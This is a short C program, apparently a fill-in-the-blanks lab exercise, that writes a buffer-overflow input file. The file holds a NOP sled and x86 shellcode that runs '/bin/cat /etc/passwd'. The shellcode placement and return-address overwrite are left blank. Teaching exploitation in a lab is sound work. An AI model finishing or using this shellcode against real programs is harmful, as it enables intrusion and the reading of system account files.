/* gen_exploit_b.c */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64"
"\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

void main(int argc, char **argv) {
  char buffer[499];
  FILE *exploit_file;

  /* Setup NOP sled */
  memset(buffer, 0x90, 499);

  /* Where should the shellcode go? */
  memcpy(???, shellcode, sizeof(shellcode)-1);

  /* Also need to overwrite the return address with the location of
     where our shellcode will be in virtual memory */
  ?


  exploit_file = fopen("./exploit_b", "w");
  fwrite(buffer, sizeof(buffer), 1, exploit_file);
  fclose(exploit_file);
}
